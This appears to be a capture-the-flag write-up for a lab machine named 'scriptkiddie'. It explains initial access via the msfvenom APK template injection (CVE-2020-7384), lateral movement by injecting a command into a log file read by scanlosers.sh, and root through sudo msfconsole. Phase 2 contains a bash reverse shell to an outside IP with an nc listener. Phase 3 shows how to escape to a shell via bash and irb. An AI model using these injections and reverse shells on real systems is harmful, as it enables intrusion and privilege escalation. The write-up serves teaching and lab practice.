Phase 1

Initial Access — msfvenom APK Template Injection (CVE-2020-7384)

How CVE-2020-7384 works When msfvenom processes an Android APK template, it reads the APK's signing certificate. The CN (Common Name) field of the certificate is passed to a shell command without sanitization. By embedding a reverse shell command in the CN field during APK signing, we get code execution when msfvenom processes our malicious template.

Phase 2

Lateral Movement — kid → pwn (Command Injection via scanlosers.sh)

Analyzing the Script

kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
#!/bin/bash
log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
Understanding the injection The script reads /home/kid/logs/hackers, uses cut -d' ' -f3- to extract everything from the 3rd space-delimited field onward, and passes it directly to sh -c "nmap ... ${ip}". By writing a line with two dummy fields followed by a semicolon and our command, the shell interprets the semicolon as a command separator. The script auto-clears the log file after processing, so the injection is one-shot.

Exploitation

# Start listener for pwn's shell
$ nc -lvnp 5555

# Inject command — two dummy fields + semicolon + reverse shell
kid@scriptkiddie:~$ echo 'x x ;/bin/bash -c "bash -i >& /dev/tcp/10.10.14.15/5555 0>&1" #' \

Phase 3

Privilege Escalation — sudo msfconsole

pwn@scriptkiddie:~$ sudo -l
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
Why msfconsole = root shell msfconsole is written in Ruby and has a built-in irb command that drops into an Interactive Ruby shell. Ruby's system() function executes system commands. Since msfconsole runs as root via sudo, any command executed through irb also runs as root. This is the same principle as sudo vim → :!bash. 
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole

# Method 1: Just type bash (msfconsole passes unknown commands to shell)
msf6 > bash
root@scriptkiddie:~#

# Method 2: Use Ruby's irb
msf6 > irb
>> system("/bin/bash")
root@scriptkiddie:~#
Appendix

Key Takeaways

Security tools can be attack vectors.

msfvenom itself had a CVE that allowed code execution through malicious APK templates. Using a tool doesn't make you secure — the tool itself needs to be patched.

Shell scripts without input validation = command injection.

scanlosers.sh read a file and passed content directly to sh -c. The cut command was the only "filter" — easily bypassed with dummy fields.

Interactive CLI tools with sudo = instant root.

msfconsole, vim, less, python, ruby, perl — any interactive program that can spawn a shell or execute commands becomes a root shell when run with sudo.

APK inject → kid→scanlosers.sh → pwn→sudo msfconsole → root
